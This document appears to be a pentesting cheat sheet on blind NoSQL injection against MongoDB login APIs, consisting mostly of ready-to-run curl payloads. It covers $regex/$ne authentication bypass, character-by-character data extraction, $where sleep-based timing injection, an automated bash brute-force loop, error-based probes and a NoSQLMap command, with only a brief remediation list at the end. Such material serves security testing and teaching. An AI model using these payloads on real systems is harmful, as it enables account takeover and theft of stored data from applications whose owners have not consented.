# Blind NoSQL Injection

## Summary
When NoSQL injection results are not directly visible, use time-based or boolean-based techniques to infer data character by character.

## Boolean-Based Blind

### Login Detection
```bash
# True condition → login success (200, redirect)
curl -X POST https://target.com/api/login \
  -d '{"username": {"$regex": ".*"}, "password": {"$ne": ""}}'

# False condition → login failure (401)
curl -X POST https://target.com/api/login \
  -d '{"username": {"$regex": "zzz"}, "password": {"$ne": ""}}'
```

### Extract String Data
```bash
# Check first character of username
curl -X POST https://target.com/api/login \
  -d '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}'
# 200 → first char is 'a'

# Check second character
curl -X POST https://target.com/api/login \
  -d '{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}'
# 200 → second char is 'd'

# Character range check
curl -X POST https://target.com/api/login \
  -d '{"username": {"$regex": "^[a-m]"}, "password": {"$ne": ""}}'
# 200 → first char in range a-m
```

## Time-Based Blind

### $where with sleep
```bash
# Confirm injection — expect 5 second delay
time curl -X POST https://target.com/api/login \
  -d '{"$where": "sleep(5000)"}'

# Conditional delay
time curl -X POST https://target.com/api/login \
  -d '{"$where": "if(this.username[0]=="a"){sleep(5000)}"}'
```

### Automated Extraction Script
```bash
# Bruteforce with curl and timing
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  START=$(date +%s%N)
  curl -s -o /dev/null -X POST https://target.com/api/login \
    -d "{\"\$where\": \"if(this.username[0]=='$c'){sleep(3)}\"}"
  END=$(date +%s%N)
  ELAPSED=$(( (END - START) / 1000000 ))
  if [ $ELAPSED -gt 2500 ]; then
    echo "Character found: $c (${ELAPSED}ms)"
    break
  fi
done
```

## Error-Based Blind

Some MongoDB configurations return different error messages:

```bash
# Type confusion — may reveal data
curl -X POST https://target.com/api/login \
  -d '{"username": {"$ne": null, "$where": "this.password.length"}  }'

# Look for stack traces containing data values
curl -X POST https://target.com/api/login \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'
```

## Tools

### NoSQLMap (automated)
```bash
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py --target https://target.com/api/login \
  --data '{"username":"admin","password":"test"}' \
  --technique BETTER
```

## Remediation
- Validate and reject input keys starting with `$`
- Use strict ORM schemas that cast input types
- Implement rate-limiting to slow automated extraction
- Monitor for `$where` usage via database audit logs
